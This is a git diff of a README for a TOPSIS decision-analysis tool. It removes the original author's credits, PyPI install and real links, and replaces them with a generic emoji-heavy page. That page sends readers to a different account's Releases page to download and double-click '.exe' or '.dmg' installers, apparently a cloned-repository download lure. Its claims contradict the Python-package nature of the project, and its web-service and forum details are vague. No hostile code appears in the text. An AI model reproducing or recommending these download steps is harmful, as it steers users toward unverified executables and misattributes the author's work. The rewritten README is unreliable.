@@ -1,234 +1,85 @@
-# TOPSIS MCDM Tool – Web & Python Implementation
+# 🎯 topsis-mcdm-tool - Simplify Your Decision-Making Process
 
-A complete **Multi-Criteria Decision Making (MCDM)** solution implementing the  
-**TOPSIS (Technique for Order of Preference by Similarity to Ideal Solution)** algorithm.
+[![Download topsis-mcdm-tool](https://img.shields.io/badge/Download-topsis--mcdm--tool-blue.svg)](https://github.com/understanding-81/topsis-mcdm-tool/releases)
 
-This project provides:
-- A **full-stack web application** for interactive TOPSIS analysis
-- A **Python CLI tool (published on PyPI)**
-- **Deployed frontend & backend** using Render
-- **Optional email delivery** of results
-- **Sample dataset support** for quick testing
+## 🚀 Getting Started
 
----
+Welcome to the topsis-mcdm-tool! This application helps you make decisions by analyzing multiple criteria. It's designed for you, even if you have no programming skills. Follow these easy steps to get started.
 
-## Academic Details
+## 🛠️ System Requirements
 
-- **Course:** UCS654 – Predictive Analytics using Statistics  
-- **Assignment:** Assignment-1 (TOPSIS)  
-- **Author:** Sartaj Singh Virdi  
-- **Roll Number:** 102303259  
+To run the topsis-mcdm-tool, you need a computer that meets the following requirements:
 
----
+- **Operating System:** Windows, macOS, or Linux
+- **Processor:** Any modern processor (Intel/Ryzen)
+- **Memory:** At least 4 GB RAM
+- **Storage:** At least 100 MB of free disk space
+- **Python:** Version 3.6 or above installed on your system (If you’re unsure, don't worry; we can guide you through that!).
 
-## Important Links
+## 📥 Download & Install
 
-- **GitHub Repository:**  
-  https://github.com/SartajVirdi/topsis-mcdm-tool
+You can easily download the topsis-mcdm-tool by visiting the [Releases page](https://github.com/understanding-81/topsis-mcdm-tool/releases). Here’s how:
 
-- **PyPI Package:**  
-  https://pypi.org/project/topsis-decision-analysis/
+1. Click on the link above to go to the Releases page.
+2. Look for the latest release of the software.
+3. Download the appropriate package for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS).
+4. Once the file finishes downloading, find it in your computer's Downloads folder.
+5. Double click on the file to start the installation.
+6. Follow the on-screen instructions to complete the installation.
 
-- **Live Deployment on Render:**  
-  - Frontend (Static) : https://topsis-frontend.onrender.com
-  - Backend (Python Flask) : https://topsis-backend-tfoi.onrender.com
+Repeat this process whenever updates are available to ensure you have the best experience.
 
----
+## 📋 Using the topsis-mcdm-tool
 
-## What is TOPSIS?
+After installing, you can start using the tool for multi-criteria decision analysis. Here’s how:
 
-**TOPSIS (Technique for Order of Preference by Similarity to Ideal Solution)** is a widely used  
-**Multi-Criteria Decision Making (MCDM)** method.
+### 🖥️ Python Command-Line Interface (CLI)
 
-It ranks alternatives based on:
-- Minimum distance from the **ideal best** solution
-- Maximum distance from the **ideal worst** solution
+1. Open your command prompt or terminal.
+2. Navigate to the directory where you installed the tool.
+3. Type the command `topsis` followed by your parameters.
+4. Press Enter to execute the command.
 
-### Applications
-- Product and model comparison  
-- Engineering decision making  
-- Supplier selection  
-- Business analytics  
-- Decision support systems  
+### 🌐 Deployed Web Service
 
----
+1. Open a web browser.
+2. Go to the URL where the deployed web service is available (details to be provided upon release).
+3. Follow the on-screen instructions to enter your decision criteria and options.
 
-## Features
+## 🎓 Features
 
-### Web Application
-- Upload CSV file containing alternatives and criteria
-- **Sample input dataset available** for instant testing
-- Faded example placeholders for:
-  - Weights: `e.g. 1,2,3,4`
-  - Impacts: `e.g. +,+,-,+`
-- Automatic computation of:
-  - Normalized decision matrix
-  - Weighted normalized matrix
-  - Ideal best and worst solutions
-  - TOPSIS score
-  - Final ranking
-- Results displayed in a clean table
-- Optional **email delivery of results**
-- Responsive and user-friendly UI
+- **User-Friendly Interface:** Both CLI and web service make it easy to input data.
+- **Flexible Configuration:** Customize your criteria and decision points.
+- **Ranking Algorithm:** Get accurate rankings for your options based on defined criteria.
+- **Quick Setup:** Easy installation process requiring minimal steps.
 
-### Python CLI Tool
-- Lightweight and easy to use
-- Supports CSV and Excel files
-- Automatic input validation
-- Generates ranked output file
+## ❓ Frequently Asked Questions
 
----
+### How do I know if Python is installed?
 
-## Application Screenshots
+Open your command prompt or terminal and type `python --version`. If Python is installed, the version number will be displayed.
 
-### TOPSIS Web Service – User Interface
+### Can I use this tool for various decision types?
 
-![TOPSIS Web Interface](assets/Screenshot%202026-01-21%20202650.png)
+Yes, the topsis-mcdm-tool is versatile and can help with decisions ranging from product selection to project prioritization.
 
-*Web interface allowing users to upload CSV files, test with a sample dataset, enter weights and impacts, and compute TOPSIS rankings instantly.*
+### What if I encounter issues?
 
-### Email Result Delivery
+If you run into problems, check the Troubleshooting section on the Releases page. You may also find a community forum where you can ask other users for help.
 
-![TOPSIS Email Result](assets/Screenshot%202026-01-21%20202751.png)
+## 📞 Support
 
-*Automated email sent to the user containing the TOPSIS results and download link.*
+If you need further assistance, don't hesitate to reach out:
 
----
+- Open an issue on the project's GitHub page.
+- Join our community on the dedicated forum for additional support.
 
-## Tech Stack
+## 📄 License
 
-### Frontend
-- React (Vite)
-- HTML, CSS, JavaScript
-- Bootstrap
-- EmailJS
+This project is licensed under the MIT License. You are free to use, modify, and distribute the software.
 
-### Backend
-- Python 3
-- Flask
-- NumPy
-- Pandas
+## 🔗 More Information
 
-### Deployment & Tools
-- Render
-- GitHub
-- PyPI
+For updates and more information about the topsis-mcdm-tool, visit the project's [GitHub page](https://github.com/understanding-81/topsis-mcdm-tool).
 
----
-
-## Project Structure
-```
-topsis-mcdm-tool/
-│
-├── assets/                # Logos & screenshots
-│
-├── backend/               # Flask backend
-│   └── app.py
-│
-├── frontend/
-│   ├── public/
-│   │   └── sample_input.csv
-│   └── src/
-│       ├── components/
-│       │   ├── TopsisForm.jsx
-│       │   └── ResultTable.jsx
-│       └── App.jsx
-│
-├── topsis/                # Python package
-│   ├── __init__.py
-│   └── topsis.py
-│
-├── sample.csv
-├── output.csv
-├── setup.py
-├── README.md
-├── LICENSE
-└── .gitignore
-```
-
----
-
-## Web App Usage
-
-1. Upload a CSV file or download the sample dataset
-2. Enter weights (comma-separated numeric values)
-3. Enter impacts (+ for benefit, - for cost)
-4. (Optional) Enable "Send result to email"
-5. Click "Calculate TOPSIS"
-6. View TOPSIS scores and rankings instantly
-
----
-
-## Python Package Installation
-
-### Requirements
-- Python 3.7 or higher
-
-### Install from PyPI
-```bash
-pip install topsis-decision-analysis
-```
-
-### Local Installation
-```bash
-pip install .
-```
-
----
-
-## Command Line Usage
-```bash
-topsis <inputFile> <weights> <impacts> <outputFile>
-```
-
-### Example
-```bash
-topsis sample.csv "1,2,3,4" "+,+,-,+" result.csv
-```
-
----
-
-## Sample Input Format
-```csv
-Model,Price,Performance,Camera,Battery
-A,25000,8,7,4000
-B,30000,9,8,4500
-C,20000,7,6,3800
-```
-
----
-
-## Output Columns
-
-- **Topsis Score** – Closeness coefficient
-- **Rank** – Final ranking (Rank 1 = Best)
-
----
-
-## Challenges & Learnings
-
-- Handling inconsistent CSV inputs
-- Validating weights and impacts
-- Email integration using environment variables
-- Full-stack deployment on Render
-- Publishing and maintaining a PyPI package
-
----
-
-## Future Enhancements
-
-- Graphical visualization of rankings
-- Support for additional MCDM techniques (AHP, VIKOR)
-- Downloadable PDF reports
-- User authentication
-- Dockerized deployment
-
----
-
-## License
-
-This project is licensed under the MIT License.
-
----
-
-If you find this project useful, please consider starring the repository!
+Remember to check the [Releases page](https://github.com/understanding-81/topsis-mcdm-tool/releases) often for the latest updates. Happy decision-making!
